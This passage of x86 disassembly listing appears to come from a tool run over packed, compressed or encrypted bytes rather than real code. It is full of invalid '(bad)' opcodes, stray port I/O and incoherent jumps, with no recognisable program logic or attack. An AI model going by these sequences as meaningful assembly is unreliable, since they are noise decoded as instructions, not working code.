  415dfc:	pop    edx
  415dfd:	out    dx,eax
  415dfe:	pop    ss
  415dff:	in     al,dx
  415e00:	xchg   eax,ebp
  415e02:	sub    al,0xf8
  415e04:	daa    
  415e05:	inc    ebx
  415e06:	inc    ecx
  415e07:	sbb    esp,edx
  415e09:	dec    edx
  415e0a:	dec    edx
  415e0b:	mov    edi,0xe35b5650
  415e10:	xor    BYTE PTR [ebx+0x18],ah
  415e13:	inc    ecx
  415e14:	pusha  
  415e15:	pusha  
  415e16:	aad    0x2c
  415e18:	int3   
  415e19:	sbb    al,0xc9
  415e1b:	inc    ecx
  415e1c:	in     eax,dx
  415e1d:	dec    edi
  415e1e:	sub    BYTE PTR [ebx-0x21],bl
  415e21:	mov    edi,0xda29b5e6
  415e26:	fistp  QWORD PTR [eax+0x4bd64a03]
  415e2c:	mov    cl,0xb9
  415e2e:	and    eax,0x85909751
  415e33:	add    al,0x96
  415e35:	loopne 0x415e13
  415e37:	test   al,0x83
  415e39:	fadd   DWORD PTR [ebx+0x1e70d5b4]
  415e3f:	jecxz  0x415ea1
  415e41:	adc    esp,DWORD PTR [edx]
  415e43:	arpl   WORD PTR [ecx-0x668566fe],di
  415e49:	mov    al,BYTE PTR [ecx]
  415e4b:	inc    ebp
  415e4c:	pop    ebx
  415e4d:	mov    bh,0x34
  415e4f:	adc    esi,DWORD PTR [esi+0x5689044f]
  415e55:	dec    edx
  415e56:	aam    0x9b
  415e58:	add    al,0xf3
  415e5a:	hlt    
  415e5b:	aam    0x6e
  415e5d:	in     al,0x1e
  415e5f:	fs jnp 0x415e19
  415e62:	pusha  
  415e63:	jb     0x415e4e
  415e65:	cdq    
  415e66:	pop    ebx
  415e67:	and    al,0x5f
  415e69:	arpl   WORD PTR [eax+0x5a],ax
  415e6c:	or     dl,BYTE PTR [esi+eiz*2+0xe]
  415e70:	jb     0x415e67
  415e72:	cmp    al,0xf8
  415e74:	add    al,0x78
  415e76:	sbb    BYTE PTR [edi+0x56301375],0xd0
  415e7d:	mov    dl,0x27
  415e7f:	in     eax,0xb2
  415e81:	jb     0x415e51
  415e83:	sahf   
  415e84:	call   0x9c72a2df
  415e89:	in     eax,dx
  415e8a:	loop   0x415e70
  415e8c:	daa    
  415e8d:	shr    BYTE PTR [edx],0xa4
  415e90:	js     0x415ebd
  415e92:	push   ss
  415e93:	xor    BYTE PTR [edx-0x6a],bl
  415e96:	imul   ebp,esp,0x0
  415e99:	ja     0x415eb5
  415e9b:	push   0x24798ba4
  415ea0:	popf   
  415ea1:	inc    esp
  415ea2:	sbb    dh,bl
  415ea4:	push   ss
  415ea5:	pop    ebx
  415ea6:	daa    
  415ea7:	sti    
  415ea8:	add    eax,0xa2e18585
  415ead:	les    eax,FWORD PTR ds:0xb6cb8983
  415eb3:	je     0x415eb0
  415eb5:	push   es
  415eb6:	neg    DWORD PTR [edx-0x4dbf95ed]
  415ebc:	xlat   BYTE PTR ds:[ebx]
  415ebd:	jp     0x415e9e
  415ebf:	mov    dh,0x87
  415ec1:	lods   eax,DWORD PTR ds:[esi]
  415ec2:	cmp    al,0xae
  415ec4:	fwait
  415ec5:	mov    WORD PTR [edi],cs
  415ec7:	dec    esi
  415ec8:	xlat   BYTE PTR ds:[ebx]
  415ec9:	outs   dx,BYTE PTR ds:[esi]
  415eca:	add    BYTE PTR [ebx-0x759760ec],0xf4
  415ed1:	fs je  0x415ef0
  415ed4:	je     0x415f2d
  415ed6:	xor    DWORD PTR [ecx],ecx
  415ed8:	inc    esp
  415ed9:	ror    BYTE PTR [eax+0x32],cl
  415edc:	xchg   edx,eax
  415edd:	xor    bh,BYTE PTR [ecx+0x5b]
  415ee0:	cmc    
  415ee1:	xchg   ebx,eax
  415ee2:	fild   DWORD PTR [edi-0x6a]
  415ee5:	repnz int 0xa6
  415ee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ee9:	add    al,0xe1
  415eeb:	sbb    ah,BYTE PTR [edx+0xd3b8745]
  415ef1:	inc    ebp
  415ef2:	mov    edx,0xebd9d281
  415ef7:	cmp    eax,DWORD PTR [ebx]
  415ef9:	cli    
  415efa:	xchg   esp,eax
  415efb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415efc:	aaa    
  415efd:	sahf   
  415efe:	repz mov esi,0x58630f5e
  415f04:	jnp    0x415f82
  415f06:	aad    0x27
  415f08:	push   edx
  415f09:	jmp    0x415f86
  415f0b:	or     cl,BYTE PTR [ecx-0x7c]
  415f0e:	in     al,0xd9
  415f10:	(bad)  
  415f11:	test   al,0x6e
  415f13:	dec    ebx
  415f14:	jo     0x415efa
  415f16:	or     DWORD PTR [ecx-0xe],esp
  415f19:	rcr    DWORD PTR [ebx],0x77
  415f1c:	and    ah,dl
  415f1e:	hlt    
  415f1f:	add    eax,0xadb49d13
  415f24:	stc    
  415f25:	jns    0x415f69
  415f27:	inc    ecx
  415f28:	sbb    dh,BYTE PTR [edx+0x9]
  415f2b:	xchg   edi,eax
  415f2c:	and    cl,BYTE PTR [ebx-0x680cb5b9]
  415f32:	sbb    ecx,DWORD PTR [edx]
  415f34:	into   
  415f35:	mov    cl,0x94
  415f37:	add    eax,0x4a9b66d4
  415f3c:	mov    WORD PTR [edi],fs
  415f3e:	ds dec ecx
  415f40:	cmp    cl,BYTE PTR [ecx+edx*8]
  415f43:	push   edi
  415f44:	stos   BYTE PTR es:[edi],al
  415f45:	adc    eax,0x8bb1d532
  415f4a:	pop    ecx
  415f4b:	div    BYTE PTR [ebx-0x27]
  415f4e:	lahf   
  415f4f:	in     al,dx
  415f50:	retf   0xf2f7
  415f53:	sub    cl,ah
  415f55:	sub    BYTE PTR [edi],bh
  415f57:	adc    al,0xd4
  415f59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f5a:	mov    DWORD PTR [esi+0x1c5d4a7c],esp
  415f60:	mov    ebx,0x74cd1a4
  415f65:	mov    esp,0x6de810e1
  415f6a:	xchg   ecx,eax
  415f6b:	pop    es
  415f6c:	imul   ebp,edx,0x5b548c25
  415f72:	push   ds
  415f73:	int    0xc
  415f75:	fldcw  WORD PTR [ebx+ebp*2]
  415f78:	popa   
  415f79:	in     al,dx
  415f7a:	add    eax,0x2aac60bb
  415f7f:	add    ebx,DWORD PTR [edx-0x5bd03285]
  415f85:	xor    al,0x9d
  415f87:	scas   al,BYTE PTR es:[edi]
  415f88:	sbb    eax,0x33e7dc9d
  415f8d:	xchg   esp,eax
  415f8e:	aad    0xc8
  415f90:	jg     0x415f67
  415f92:	retf   0x361
  415f95:	mov    esp,0xfbe12903
  415f9a:	pop    esi
  415f9b:	dec    esp
  415f9c:	xor    DWORD PTR [edx-0x4d1080a2],0x79
  415fa3:	jbe    0x415f71
  415fa5:	lock pushf 
  415fa7:	dec    esp
  415fa8:	jl     0x415f43
  415faa:	inc    edx
  415fab:	adc    DWORD PTR [esi+0x1695d202],esp
  415fb1:	(bad)  
  415fb2:	(bad)  
  415fb3:	push   cs
  415fb4:	popf   
  415fb5:	xchg   ecx,eax
  415fb6:	pop    es
  415fb7:	dec    edx
  415fb8:	cli    
  415fb9:	mov    ebx,0x6ac04e39
  415fbe:	in     al,dx
  415fbf:	rol    DWORD PTR [edx],1
  415fc1:	in     eax,0x22
  415fc3:	push   0xfffffff8
  415fc5:	xchg   esi,eax
  415fc6:	enter  0x63bc,0xf0
  415fca:	push   eax
  415fcb:	lods   eax,DWORD PTR ds:[esi]
  415fcc:	aaa    
  415fcd:	(bad)  
  415fce:	fistp  WORD PTR [ecx-0x4196c483]
  415fd4:	mov    esp,0xe4b9e1cd
  415fd9:	pushf  
  415fda:	sub    DWORD PTR [eax+0x20],0xce14b0d3
  415fe1:	test   eax,0xc7d42af6
  415fe6:	fnsave [esi-0x4c1dc1f0]
  415fec:	jno    0x415ffd
  415fee:	int3   
  415fef:	xlat   BYTE PTR ds:[ebx]
  415ff0:	xchg   esi,eax
  415ff1:	or     ecx,0x71
  415ff4:	sbb    dl,BYTE PTR [edx-0x54]
  415ff7:	(bad)  
  415ff8:	outs   dx,DWORD PTR ds:[si]
  415ffa:	cmp    DWORD PTR ds:0xeb9cc5ce,ecx
  416000:	xchg   DWORD PTR [ebp+0x63],edx
  416003:	xchg   edx,eax
  416004:	sahf   
  416005:	add    esi,ebx
  416007:	leave  
  416008:	scas   al,BYTE PTR es:[edi]
  416009:	jle    0x415fa5
  41600b:	jg     0x41606f
  41600d:	mov    ecx,0xda0c7b2c
  416012:	call   0xa85e86da
  416017:	mov    BYTE PTR [ecx],bh
  416019:	leave  
  41601a:	mov    eax,ds:0x5fe260ad
  41601f:	pop    es
  416020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416021:	lea    esp,[edx]
  416023:	mov    edi,DWORD PTR [ecx]
  416025:	jp     0x416081
  416027:	push   ebx
  416028:	inc    eax
  416029:	mov    bh,BYTE PTR [ebx]
  41602b:	xlat   BYTE PTR ds:[ebx]
  41602c:	push   edx
  41602d:	xchg   ebx,eax
  41602e:	sbb    esi,DWORD PTR [edi]
  416030:	and    BYTE PTR [edi],dh
  416032:	in     eax,0xf5
  416034:	scas   al,BYTE PTR es:[edi]
  416035:	pop    esi
  416036:	je     0x415fc3
  416038:	sub    DWORD PTR [esi+0x13],esp
  41603b:	cmp    eax,0xba22c8dd
  416040:	ror    BYTE PTR [edi-0x4110a1d0],0xe6
  416047:	add    DWORD PTR gs:[edx+0x68],ebp
  41604b:	inc    esi
  41604c:	daa    
  41604d:	sub    BYTE PTR [edi+0x380373bc],cl
  416053:	pop    ebx
  416054:	sub    al,0xa8
  416056:	mov    dh,0xdf
  416058:	and    dl,BYTE PTR [edi+0x4ab2b45]
  41605e:	mov    eax,ds:0xb1f85a43
  416063:	cld    
  416064:	add    al,0x43
  416066:	scas   al,BYTE PTR es:[edi]
  416067:	adc    BYTE PTR [eax],0x19
  41606a:	(bad)  
  41606b:	cmp    DWORD PTR [esi-0x38d3550e],esp
  416071:	popf   
  416072:	lock dec ebx
  416074:	jb     0x4160aa
  416076:	mov    DWORD PTR [edx],edi
  416078:	(bad)  
  416079:	aas    
  41607a:	xlat   BYTE PTR ds:[ebx]
  41607b:	xchg   DWORD PTR [edx-0x2a1d811],esp
  416081:	and    al,0xa9
  416083:	mov    esi,0x5ecc57a8
  416088:	jns    0x4160fd
  41608a:	ins    DWORD PTR es:[edi],dx
  41608b:	not    DWORD PTR [ebp+edx*4+0x79889b48]
  416092:	mov    ds:0x1be5eb2,al
  416097:	adc    al,ah
  416099:	jp     0x416076
  41609b:	es pushf 
  41609d:	mov    WORD PTR [esi],gs
  41609f:	into   
  4160a0:	in     al,0x50
  4160a2:	mov    ebp,0xedf3487c
  4160a7:	retf   0x770
  4160aa:	lods   eax,DWORD PTR ds:[esi]
  4160ab:	dec    ebp
  4160ac:	retf   
  4160ad:	mov    esi,0x8e39b9a0
  4160b2:	xchg   DWORD PTR [ecx+ebx*4],ecx
  4160b5:	mov    al,0x4
  4160b7:	out    0xc8,eax
  4160b9:	add    eax,0x88b4c89
  4160be:	ret    0x263d
  4160c1:	mov    esi,0x5ca57afa
  4160c6:	xor    dl,al
  4160c8:	jo     0x41604b
  4160ca:	sub    al,0xff
  4160cc:	pop    edi
  4160cd:	sbb    DWORD PTR [edx+0x755205be],edi
  4160d3:	les    esp,FWORD PTR [eax]
  4160d5:	adc    DWORD PTR [esp+eax*2],edx
  4160d8:	cli    
  4160d9:	repnz sti 
  4160db:	xchg   esi,eax
  4160dc:	dec    ecx
  4160dd:	icebp  
  4160de:	or     DWORD PTR [ebx-0x6c],edi
  4160e1:	jo     0x41608a
  4160e3:	es (bad) 
  4160e6:	out    0x12,eax
  4160e8:	int3   
  4160e9:	dec    ecx
  4160ea:	cs ret 
  4160ec:	std    
  4160ed:	cmp    BYTE PTR [ebx],cl
  4160ef:	pop    es
  4160f0:	pop    esi
  4160f1:	in     al,0x47
  4160f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160f4:	push   0xfd0277bc
  4160f9:	es xchg esp,edi
  4160fc:	pop    esp
  4160fd:	ret    
  4160fe:	jbe    0x41611b
  416100:	fsub   DWORD PTR [eax]
  416102:	repz and ch,ah
  416105:	xor    cl,ch
  416107:	lea    esp,[ebx-0x1191466c]
  41610d:	in     eax,0x72
  41610f:	mov    eax,?
  416111:	lahf   
  416112:	mov    cl,0x71
  416114:	mov    WORD PTR [eax+edi*8],cs
  416117:	xor    DWORD PTR [ecx-0x52b771b5],esp
  41611d:	mov    BYTE PTR [ebp+0x283f3bb6],ah
  416123:	xor    al,0x3f
  416125:	repz add eax,0xd4092884
  41612b:	sbb    eax,ecx
  41612d:	test   al,0xab
  41612f:	bound  esp,QWORD PTR [ecx+0xa]
  416132:	sahf   
  416133:	sbb    cl,BYTE PTR [esi-0x60e466f]
  416139:	ins    DWORD PTR es:[edi],dx
  41613a:	cld    
  41613b:	xor    esi,DWORD PTR ds:0xaf73f805
  416141:	test   al,0x11
  416143:	pop    esi
  416144:	gs xchg ecx,eax
  416146:	pop    ecx
  416147:	push   0xffffffcb
  416149:	mov    eax,ds:0xdbfa6cec
  41614e:	js     0x4161c8
  416150:	cmc    
  416151:	push   ebp
  416152:	and    al,BYTE PTR [esi]
  416154:	repz popf 
  416156:	cmp    eax,0x2e22eb14
  41615b:	fs enter 0x38e7,0x33
  416160:	mov    esp,0x6d73cd40
  416165:	loopne 0x4161d6
  416167:	mov    esi,0x313f08
  41616c:	sub    BYTE PTR [ebp-0x668491cb],0xc6
  416173:	pop    edx
  416174:	aam    0x47
  416176:	ja     0x4160f8
  416178:	xchg   esi,eax
  416179:	mov    dh,0x83
  41617b:	xchg   ebx,eax
  41617c:	lds    eax,FWORD PTR [edi-0x62]
  41617f:	jo     0x4161dc
  416181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416182:	dec    esi
  416183:	in     al,dx
  416184:	ss std 
  416186:	jne    0x4161a0
  416188:	or     DWORD PTR [ebx+0x4],0xce227c18
  41618f:	jb     0x416119
  416191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416192:	add    ebp,DWORD PTR [edi]
  416194:	jp     0x416151
  416196:	aad    0x8c
  416198:	or     esp,DWORD PTR [eax-0x714f8595]
  41619e:	popf   
  41619f:	call   0x534f332
  4161a4:	retf   0x1c55
  4161a7:	mov    ebx,0x1e236ec7
  4161ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161ad:	adc    DWORD PTR [edi-0x12],0x24e6e26e
  4161b4:	out    0xef,eax
  4161b6:	jbe    0x41619f
  4161b8:	sbb    DWORD PTR [esi+esi*2-0x1e6a8c1f],0x526e057c
  4161c3:	stos   BYTE PTR es:[edi],al
  4161c4:	imul   ecx,DWORD PTR [esi],0x6d20ee1b
  4161ca:	mov    al,ds:0x646aa6d3
  4161cf:	loope  0x416237
  4161d1:	stc    
  4161d2:	cwde   
  4161d3:	sbb    DWORD PTR [esi+edx*8-0x58286953],esi
  4161da:	pusha  
  4161db:	mov    al,0x54
  4161dd:	mov    esi,0x9733e1b6
  4161e2:	push   esp
  4161e3:	push   0x38
  4161e5:	xchg   ax,ax
  4161e7:	push   ebx
  4161e8:	aam    0xf1
  4161ea:	loopne 0x416248
  4161ec:	bound  esp,QWORD PTR [esi+0x26]
  4161ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161f0:	frstor [ebx]
  4161f2:	rcl    DWORD PTR [ebp+0x31],0xde
  4161f6:	push   ds
  4161f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161f8:	xchg   BYTE PTR [ecx],al
  4161fa:	mov    dh,0xd6
  4161fc:	mov    eax,ds:0xc2955762
  416201:	xor    dl,dh
  416203:	mov    ebx,?
  416205:	(bad)  
  416207:	out    dx,eax
  416208:	mov    esi,0xc9d70dca
  41620d:	(bad)  
  41620e:	loop   0x41625d
  416210:	xchg   ecx,eax
  416211:	cmp    al,0x22
  416213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416214:	popa   
  416215:	fsubr  QWORD PTR [ebx]
  416217:	mov    ah,0xb0
  416219:	ins    DWORD PTR es:[edi],dx
  41621a:	xor    cl,BYTE PTR [ebx-0x2cfa3e48]
  416220:	popf   
  416221:	imul   eax,DWORD PTR [edi+0xa],0xbb49a40b
  416228:	out    0xa4,al
  41622a:	stc    
  41622b:	cmp    BYTE PTR [eax],0x1b
  41622e:	xlat   BYTE PTR ds:[ebx]
  41622f:	test   eax,0x6410444b
  416234:	scas   al,BYTE PTR es:[edi]
  416235:	stc    
  416236:	sti    
  416237:	inc    eax
  416238:	pop    ebx
  416239:	test   DWORD PTR [ebx-0x2a692b22],0xbc82621c
  416243:	pusha  
  416244:	push   es
  416245:	add    BYTE PTR [esi],ah
  416247:	mov    WORD PTR [ebx+0x59],ss
  41624a:	addr16 das 
  41624c:	fnstsw WORD PTR [eax+0x1841b171]
  416252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416253:	inc    edi
  416254:	mov    bl,0xdb
  416256:	inc    esp
  416257:	dec    edi
  416258:	dec    ebx
  416259:	mov    esi,DWORD PTR [ecx-0x7a]
  41625c:	mov    al,ds:0x119e1c7c
  416261:	js     0x4162d0
  416263:	stos   DWORD PTR es:[edi],eax
  416264:	mov    WORD PTR [esi+0x5d843ff8],?
  41626a:	or     eax,0xbaef83cf
  41626f:	jle    0x4162af
  416271:	(bad)  
  416272:	loop   0x4161fa
  416274:	and    BYTE PTR [edx-0x19],0xf0
  416278:	inc    ebx
  416279:	mov    dl,0x72
  41627b:	sub    ebx,DWORD PTR [eax+0x5d9e3ee8]
  416281:	loopne 0x41629c
  416283:	fldenv [edi+edx*4-0x65]
  416287:	cld    
  416288:	pop    esi
  416289:	push   ss
  41628a:	cli    
  41628b:	imul   edx,edx,0xeff0775b
  416291:	fcom   DWORD PTR [ecx+0x6aff2ff5]
  416297:	pop    esp
  416298:	xor    BYTE PTR [edx-0x77],dl
  41629b:	lea    ebp,[ecx+0x1655120d]
  4162a1:	mov    edx,0xc62c4133
  4162a6:	adc    bh,BYTE PTR [ecx+0x2275fae3]
  4162ac:	int    0xb
  4162ae:	loopne 0x41629b
  4162b0:	push   ecx
  4162b1:	mov    eax,0x21511bd5
  4162b6:	push   esp
  4162b7:	icebp  
  4162b8:	shl    BYTE PTR fs:[eax],cl
  4162bb:	fld    st(1)
  4162bd:	arpl   dx,si
  4162bf:	ja     0x416278
  4162c1:	(bad)  
  4162c2:	cld    
  4162c3:	out    dx,al
  4162c4:	push   ebx
  4162c5:	mul    ebp
  4162c7:	sti    
  4162c8:	push   0x47900253
  4162cd:	jns    0x416334
  4162cf:	mov    dh,0x8c
  4162d1:	xor    bh,0xa
  4162d4:	pop    edx
  4162d5:	mov    bl,0xc8
  4162d7:	xlat   BYTE PTR ds:[ebx]
  4162d8:	push   0xffffff91
  4162da:	into   
  4162db:	ins    DWORD PTR es:[edi],dx
  4162dc:	pop    ebx
  4162dd:	mov    BYTE PTR [edx-0x1d664d59],al
  4162e3:	rol    BYTE PTR cs:[esi+esi*4-0x43],1
  4162e8:	imul   esp,DWORD PTR [eax+0x621bbb6c],0x17
  4162ef:	fcomip st,st(3)
  4162f1:	sbb    al,0x78
  4162f3:	pop    esp
  4162f4:	and    al,0x1c
  4162f6:	std    
  4162f7:	sub    BYTE PTR [esi+0x6e85a447],bh
  4162fd:	mov    cl,0xe6
  4162ff:	pop    es
  416300:	or     edi,edx
  416302:	pop    ebp
  416303:	fidiv  DWORD PTR [eax-0x67]
  416306:	inc    edi
  416307:	jl     0x41633f
  416309:	inc    ecx
  41630a:	jno    0x4162c4
  41630c:	xchg   edx,eax
  41630d:	int3   
  41630e:	call   0x797ed613
  416313:	mov    DWORD PTR [eax],esi
  416315:	gs (bad) 
  416317:	leave  
  416318:	pushf  
  416319:	xchg   DWORD PTR ds:[edx+0xd],edi
  41631d:	xor    eax,0xc7ef29de
  416322:	sbb    eax,0xfb9f8e4d
  416327:	dec    esi
  416328:	mov    ch,0xe2
  41632a:	xor    dh,BYTE PTR [esi-0x4e]
  41632d:	pop    es
  41632e:	jecxz  0x4162ec
  416330:	lock imul ebp,DWORD PTR [eax+esi*8+0x68a1210],0x10
  416339:	push   eax
  41633a:	cmp    bl,BYTE PTR [ebx-0x1b]
  41633d:	dec    esi
  41633e:	ficomp DWORD PTR [ebx+eiz*8]
  416341:	xchg   edx,eax
  416342:	lods   eax,DWORD PTR ds:[esi]
  416343:	mov    cl,dh
  416345:	mov    edx,0xa8a1c955
  41634a:	and    esi,DWORD PTR [ebp-0x21]
  41634d:	push   edx
  41634e:	das    
  41634f:	or     eax,DWORD PTR [edx-0x6b1c797f]
  416355:	inc    edi
  416356:	or     al,0x9
  416358:	or     edx,edi
  41635a:	mov    esi,0x7957c3f2
  41635f:	xchg   esi,eax
  416360:	and    eax,DWORD PTR gs:[ecx+0x40]
  416364:	retfw  0xb04a
  416368:	outs   dx,BYTE PTR ds:[esi]
  416369:	sbb    eax,0xd63c5d7d
  41636e:	ins    BYTE PTR es:[edi],dx
  41636f:	loopne 0x4163b2
  416371:	dec    esi
  416372:	dec    esp
  416373:	sbb    al,0xb
  416375:	inc    esi
  416376:	sbb    al,0xb2
  416378:	cmc    
  416379:	inc    esp
  41637a:	bound  ecx,QWORD PTR [ebx-0x30]
  41637d:	popa   
  41637e:	jp     0x416334
  416380:	dec    edi
  416381:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416382:	inc    ebx
  416383:	outs   dx,DWORD PTR ds:[esi]
  416384:	xchg   esp,eax
  416385:	mov    eax,ds:0xbd559028
  41638a:	sbb    eax,0x1d27f584
  41638f:	xchg   esi,eax
  416390:	sbb    eax,0xcd7b9c59
  416395:	jp     0x4163f8
  416397:	push   es
  416398:	(bad)  
  416399:	out    0x8c,eax
  41639b:	mov    al,0x21
  41639d:	push   0xb8eafbe5
  4163a2:	in     eax,dx
  4163a3:	lods   al,BYTE PTR ds:[esi]
  4163a4:	(bad)  
  4163a5:	mov    DWORD PTR [ebp-0x75],ebx
  4163a8:	lahf   
  4163a9:	test   esi,ebp
  4163ab:	add    al,0xce
  4163ad:	jne    0x416363
  4163af:	call   0xe1d7c40c
  4163b4:	inc    ebp
  4163b5:	fwait
  4163b6:	xchg   DWORD PTR [edx-0x3e8aa11f],ebp
  4163bc:	jo     0x4163c0
  4163be:	pop    esp
  4163bf:	data16 jae 0x416415
  4163c2:	retf   0xdd51
  4163c5:	clc    
  4163c6:	pop    esi
  4163c7:	lahf   
  4163c8:	cmc    
  4163c9:	ins    DWORD PTR es:[edi],dx
  4163ca:	adc    BYTE PTR [esi],cl
  4163cc:	sub    ebx,ebx
  4163ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163cf:	mov    ebx,0x98e62ce8
  4163d4:	cld    
  4163d5:	jp     0x416390
  4163d7:	sar    edi,0x15
  4163da:	out    0xf0,eax
  4163dc:	cmc    
  4163dd:	es pop edx
  4163df:	mov    esp,ebp
  4163e1:	xchg   edi,eax
  4163e2:	fimul  DWORD PTR [eax-0x48]
  4163e5:	lahf   
  4163e6:	scas   al,BYTE PTR es:[edi]
  4163e7:	rcl    DWORD PTR [esi+0x66],0x85
  4163eb:	or     al,0x2e
  4163ed:	cmp    DWORD PTR [edi],eax
  4163ef:	add    esi,DWORD PTR [edx-0x46fedf20]
  4163f5:	aad    0xc6
  4163f7:	mov    ds:0xb5102e8c,eax
  4163fc:	pop    ebx
  4163fd:	adc    DWORD PTR [esi+0x30],ebp
  416400:	mov    eax,ds:0x8f4ffc27
  416405:	stc    
  416406:	dec    eax
  416407:	ror    DWORD PTR [edi],1
  416409:	dec    edi
  41640a:	push   esp
  41640b:	pop    esi
  41640c:	dec    eax
  41640d:	push   esp
  41640e:	and    ebp,ebp
  416410:	lea    eax,[esi-0x63b0c03e]
  416416:	sbb    ecx,DWORD PTR [ecx-0x5f86b9d7]
  41641c:	popa   
  41641d:	fst    QWORD PTR ds:0xcb7f3a3d
  416423:	xor    bl,BYTE PTR [esi+0x601f66c7]
  416429:	jne    0x416466
  41642b:	fidiv  WORD PTR [ecx]
  41642d:	sti    
  41642e:	push   cs
  41642f:	out    0x8c,eax
  416431:	adc    bh,ch
  416433:	cdq    
  416434:	adc    esi,ebx
  416436:	pusha  
  416437:	add    eax,0x3367ea96
  41643c:	mov    esi,0xaf6f584f
  416441:	jb     0x416459
  416443:	mov    eax,0x39c5a1df
  416448:	scas   al,BYTE PTR es:[edi]
  416449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41644a:	mov    es,eax
  41644c:	out    0x2e,eax
  41644e:	sahf   
  41644f:	(bad)  
  416450:	adc    DWORD PTR [ecx+edx*4],edi
  416453:	jno    0x41640a
  416455:	jo     0x416437
  416457:	aaa    
  416458:	dec    ebp
  416459:	in     al,0xd
  41645b:	test   al,0xc2
  41645d:	push   edi
  41645e:	inc    esp
  41645f:	and    al,0xc8
  416461:	pop    edx
  416462:	jle    0x416476
  416464:	fidivr DWORD PTR [esi-0x76]
  416467:	inc    esi
  416468:	or     DWORD PTR [eax+ebp*8],ebp
  41646b:	jno    0x416447
  41646d:	xchg   ebx,eax
  41646e:	and    ch,BYTE PTR [esi-0x76]
  416471:	mov    ch,0x7f
  416473:	pusha  
  416474:	ins    BYTE PTR es:[edi],dx
  416475:	mov    ebp,eax
  416477:	aas    
  416478:	stc    
  416479:	rcr    DWORD PTR [edi+0x5e18c06],cl
  41647f:	in     eax,dx
  416480:	imul   esi,DWORD PTR [ebx+0x6d68892e],0xa6e7faf4
  41648a:	jb     0x4164bc
  41648c:	jl     0x204c2534
  416492:	dec    ebx
  416493:	shl    ah,cl
  416495:	out    dx,al
  416496:	jb     0x41642b
  416498:	pop    edx
  416499:	xchg   BYTE PTR [edi-0x28],dl
  41649c:	jge    0x4164af
  41649e:	clc    
  41649f:	add    dh,dl
  4164a1:	js     0x416456
  4164a3:	cmp    ebp,DWORD PTR [edx+0x38eb1968]
  4164a9:	int    0x27
  4164ab:	test   BYTE PTR [ebp+0x68],0x6d
  4164af:	xchg   edi,eax
  4164b0:	mov    esi,0xa39c8839
  4164b5:	pop    edx
  4164b6:	and    eax,0x388da847
  4164bb:	inc    edi
  4164bc:	and    bl,BYTE PTR [eax]
  4164be:	jle    0x4164a7
  4164c0:	mov    ebx,0xea0d5e5e
  4164c5:	push   ebp
  4164c6:	scas   al,BYTE PTR es:[edi]
  4164c7:	mov    dh,0x8f
  4164c9:	mov    esi,0xcc5f13b8
  4164ce:	pop    ds
  4164cf:	add    eax,0x49d3e804
  4164d4:	push   0xa4a0baf8
  4164d9:	or     DWORD PTR es:0x5cfb8ee4,ebp
  4164e0:	mov    ds:0x8cc3690a,al
  4164e5:	mov    eax,0xa7de24ee
  4164ea:	retf   
  4164eb:	fs (bad) 
  4164ed:	lock (bad) 
  4164ef:	ins    DWORD PTR es:[edi],dx
  4164f0:	push   es
  4164f1:	out    dx,al
  4164f2:	xor    al,0xa4
  4164f4:	and    ecx,DWORD PTR [ebx-0x3b]
  4164f7:	mov    ebp,0x9a31376a
  4164fc:	jno    0x416514
  4164fe:	adc    al,0x90
  416500:	xor    al,0x1b
  416502:	mov    bh,0xae
  416504:	dec    edi
  416505:	or     ebp,DWORD PTR [ebx+0x52]
  416508:	adc    edx,DWORD PTR [ebx]
  41650a:	inc    ebx
  41650b:	push   cs
  41650c:	fs ret 
  41650e:	or     al,0x9b
  416510:	hlt    
  416511:	adc    BYTE PTR [edi],dl
  416513:	fwait
  416514:	xlat   BYTE PTR ds:[ebx]
  416515:	mov    al,ds:0xa077ebf2
  41651a:	(bad)  
  41651b:	loopne 0x4164be
  41651d:	out    0x55,eax
  41651f:	loop   0x416533
  416521:	mov    ds:0xd323452a,eax
  416526:	fiadd  WORD PTR [edx-0x7c]
  416529:	mov    al,ds:0x8530336
  41652e:	push   0x900bb27a
  416533:	adc    al,0xc2
  416535:	inc    edi
  416536:	push   es
  416537:	shl    esi,1
  416539:	loop   0x416513
  41653b:	xor    eax,0x9fef801
  416540:	cmp    al,0x55
  416542:	mov    ebx,esp
  416544:	ds inc esp
  416546:	sbb    BYTE PTR [ecx],bh
  416548:	xchg   ebx,eax
  416549:	fdiv   DWORD PTR [edi+0x40cecba2]
  41654f:	fist   WORD PTR [edi+eiz*1+0x4c2ce73d]
  416556:	push   ss
  416557:	call   0xb1ec8e26
  41655c:	fisubr DWORD PTR [edi+0x358115d8]
  416562:	ficomp WORD PTR [edi+0x40f26bed]
  416568:	xchg   ecx,eax
  416569:	sar    BYTE PTR [ecx+ebx*4],cl
  41656c:	inc    edi
  41656d:	sub    al,0xa
  41656f:	sbb    eax,0x5d77f2cd
  416574:	push   0x630ea1ce
  416579:	cmp    edx,DWORD PTR [edx-0x54a261a7]
  41657f:	pushf  
  416580:	dec    ebp
  416581:	lods   eax,DWORD PTR ds:[esi]
  416582:	mov    dh,0xf6
  416584:	jns    0x416534
  416586:	jns    0x416603
  416588:	aaa    
  416589:	(bad)  
  41658b:	cld    
  41658c:	stc    
  41658d:	outs   dx,DWORD PTR ds:[esi]
  41658e:	cmp    edi,0x8726ecf
  416594:	jne    0x416528
  416596:	cmp    BYTE PTR [ebx+ecx*4],bh
  416599:	fstp   TBYTE PTR [ebp+0x5e]
  41659c:	das    
  41659d:	in     eax,dx
  41659e:	mov    bl,0xf8
  4165a0:	out    dx,al
  4165a1:	sahf   
  4165a2:	jge    0x4165f8
  4165a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165a5:	fld    QWORD PTR [edx-0x1e016295]
